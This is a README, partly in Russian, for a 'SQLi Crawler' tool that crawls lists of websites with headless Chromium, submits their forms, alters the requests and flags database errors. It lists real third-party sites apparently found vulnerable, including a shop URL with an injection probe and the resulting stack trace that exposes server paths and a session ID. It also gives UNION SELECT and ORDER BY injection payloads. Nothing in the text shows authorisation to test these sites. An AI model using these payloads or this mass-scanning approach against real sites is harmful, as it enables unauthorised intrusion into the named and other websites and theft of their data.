# SQLi Crawler

> WARNING: IN ACTIVE DEVELOPMEMT!!!

Crawling links and forms using headless Chromium and check its to SQLi.

Принцип работы:

- есть список сайтов
- последовательно посещаем их внутрениие ссылки, отправляя все формы
- перехватываем запросы, а потом модифицируем их и проверяем ответы на наличие ошибок БД

Install from source:

```bash
git clone && cd
pipx install --force .
```

Usage:

```bash
~/workspace/sqli-crawler main
❯ sqli-crawler -h
usage: sqli-crawler [-h] [-i INPUT] [-o OUTPUT] [-d CRAWL_DEPTH] [--crawl-per-host CRAWL_PER_HOST] [--num-crawlers NUM_CRAWLERS] [--num-checkers NUM_CHECKERS]
                    [--req-checks REQ_CHECKS] [--executable-path EXECUTABLE_PATH] [--show-browser | --no-show-browser] [-v]

SQLi Crawler

options:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        input (default: -)
  -o OUTPUT, --output OUTPUT
                        output (default: -)
  -d CRAWL_DEPTH, --crawl-depth CRAWL_DEPTH, --depth CRAWL_DEPTH
                        max crawling depth (default: 2)
  --crawl-per-host CRAWL_PER_HOST
                        max links to crawl per host (default: 50)
  --num-crawlers NUM_CRAWLERS
                        number of crawlers (default: 25)
  --num-checkers NUM_CHECKERS
                        number of sqli checkers (default: 10)
  --req-checks REQ_CHECKS
                        max checks for request (default: None)
  --executable-path EXECUTABLE_PATH
                        chrome-like browser executable path. use environment variable `CHROME_EXECUTABLE_PATH` instead (default: None)
  --show-browser, --no-show-browser
                        show the browser (default: False)
  -v, --verbosity       be more verbosity (default: 0)
```

```bash
poetry run playwright install chromium
```

```json
{
  "method": "GET",
  "url": "https://<cut>/fsrch_res.php",
  "status_code": 200,
  "params": { "Lang": "it", "SrchText": "test'\"", "SrchInto": "All" },
  "cookies": { "PHPSESSID": "af9v7sp51r5va8hrtqog05auo0" },
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "referer": "https://<cut>/home.php?Lang=it",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\""
  },
  "match": "You have an error in your SQL syntax"
}
```

## Notes

`pyppeteer` падал с загадочными ошибками, поэтому был заменен на `playwright`.

```
[E] Connection closed while reading from the driver
Traceback (most recent call last):
  ...
playwright._impl._api_types.TimeoutError: Timeout 15000ms exceeded.

=========================== logs ===========================
navigating to "https://5elementshostel.de/frankfurt/#reviews", waiting until "networkidle"
============================================================

  File "/home/sergey/.cache/pypoetry/virtualenvs/sqli-crawler-pMyiD5aU-py3.11/lib/python3.11/site-packages/playwright/_impl/_connection.py", line 97, in inner_send
    result = next(iter(done)).result()
             ^^^^^^^^^^^^^^^^^^^^^^^^^
Exception: Connection closed while reading from the driver

future: <Task finished name='Task-2253' coro=<SQLiCrawler.handle_route() done, defined at /home/sergey/workspace/sqli-crawler/sqli_crawler/crawler.py:122> exception=Error('POST data is not a valid JSON object: ------WebKitFormBoundary7XSTb8eK9A02QFw9\r\nContent-Disposition: form-data; name="_requestToken"\r\n\r\n0\r\n------WebKitFormBoundary7XSTb8eK9A02QFw9--\r\n')>
Traceback (most recent call last):
  File "/home/sergey/.cache/pypoetry/virtualenvs/sqli-crawler-pMyiD5aU-py3.11/lib/python3.11/site-packages/playwright/_impl/_network.py", line 181, in post_data_json
    return json.loads(post_data)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/json/__init__.py", line 346, in loads
    return _default_decoder.decode(s)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/json/decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/json/decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)

aiohttp.client_exceptions.ClientOSError: Cannot write to closing transport

aiohttp.client_exceptions.ClientOSError: Cannot write to closing transport
```

Если количество краулеров задано как `25`, то количество вкладок будет минимум 26, так как стартовая вкладка не управляется, и до закрытия старой страницы успевает открытьяс новая, те максимальное количество вкладок будет 25 \* 2 + 1?

Initiator пока не реализован.

https://github.com/microsoft/playwright/issues/16326

### SQL Errors Examples

`https://shop.roeder-feuerwerk.de/?eventchanger=2%27%22`

```
<br>
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"' WHERE sessionID = 'im0fjag9sqck1hdefmj8fk568s'' at line 1 in /var/www/clients/client1/web4/web/engine/Library/Zend/Db/Adapter/Pdo/Abstract.php:256
Stack trace:
#0 /var/www/clients/client1/web4/web/engine/Library/Zend/Db/Adapter/Pdo/Abstract.php(256): PDO-&gt;exec()
#1 /var/www/clients/client1/web4/web/custom/plugins/MofaEventShopping/Subscriber/Frontend/Frontend.php(172): Zend_Db_Adapter_Pdo_Abstract-&gt;exec()
#2 /var/www/clients/client1/web4/web/engine/Library/Enlight/Event/Handler/Default.php(90): MofaEventShopping\Subscriber\Frontend\Frontend-&gt;onFrontendPostDispatch()
#3 /var/www/clients/client1/web4/web/engine/Library/Enlight/Event/EventManager.php(207): Enlight_Event_Handler_Default-&gt;execute()
#4 /var/www/clients/client1/web4/web/engine/Library/Enlight/Controller/Action.php(223): Enlight_Event_ in <b>/var/www/clients/client1/web4/web/engine/Library/Zend/Db/Adapter/Pdo/Abstract.php</b> on line <b>271</b><br>
```

```
order by 1..20,10,40,30
handler.php?id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11
```

https://gist.github.com/s3rgeym/70d968ac28b07ddce1515dc1a403521f
